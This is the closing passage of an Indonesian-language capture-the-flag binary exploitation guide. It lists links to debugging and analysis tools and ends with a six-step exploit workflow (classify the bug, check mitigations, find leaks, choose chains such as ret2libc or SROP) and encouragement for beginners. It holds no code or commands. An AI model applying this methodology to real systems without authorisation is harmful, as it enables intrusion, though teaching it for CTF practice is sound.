- pwndbg tcache docs: https://pwndbg.readthedocs.io/en/latest/commands/heap/tcachebins/
- GEF repo/docs: https://github.com/hugsy/gef
- GEF heap docs: https://hugsy.github.io/gef/commands/heap/
- GEF heap analysis helper: https://hugsy.github.io/gef/commands/heap-analysis-helper/
- checksec project: https://slimm609.github.io/checksec/
- checksec repo: https://github.com/slimm609/checksec
- angr docs: https://docs.angr.io/
- angr quickstart: https://api.angr.io/en/v9.2.42/quickstart.html
- angr repo: https://github.com/angr/angr
- libc-database: https://github.com/niklasb/libc-database
- libc.rip via libc-database README: https://libc.rip/
- radare2 book: https://book.rada.re/
- radare2 debugger intro: https://book.rada.re/debugger/intro.html
- one_gadget repo: https://github.com/david942j/one_gadget

---

## 72. Penutup Praktis

**Kalau kamu hanya mengingat sedikit dari dokumen ini, ingat urutan ini:**

1. **klasifikasikan bug** — stack? heap? format string? integer?
2. **baca mitigasi** — NX? Canary? PIE? RELRO? seccomp?
3. **cari leak** — libc? PIE? canary? heap?
4. **pilih chain termurah** — ret2libc? ORW? SROP? shellcode?
5. **samakan environment** — patchelf, parity remote
6. **baru optimalkan exploit** — tuning dan testing

### Kata-kata terakhir buat pemula:

**PWN itu kayak main teka-teki:**
- Ada pintu (bug) yang harus kamu temukan dulu
- Ada banyak kunci (teknik exploit)
- Tugas kamu: pilih kunci yang PAS buat pintu itu

**Jangan pusing sama semua teknik sekaligus.** Mulai dari yang paling dasar:
1. Stack overflow + ret2win (kalo ada win function)
2. Stack overflow + ret2libc (kalo NX aktif)
3. Format string leak (kalo ada printf bocor)
4. Sederhana dulu, baru naik ke heap dan teknik advanced

**Yang paling penting: Praktek!** Baca teori doang gak bakal bikin kamu jago PWN. Buka writeup, buka binary, coba sendiri, gagal, coba lagi. Setiap gagal = kamu belajar sesuatu.

**PWN yang rapi bukan soal hafal semua trik; PWN yang rapi adalah selalu tahu kenapa kamu memilih satu jalur dan meninggalkan jalur lain.**

Happy pwning! 🐧
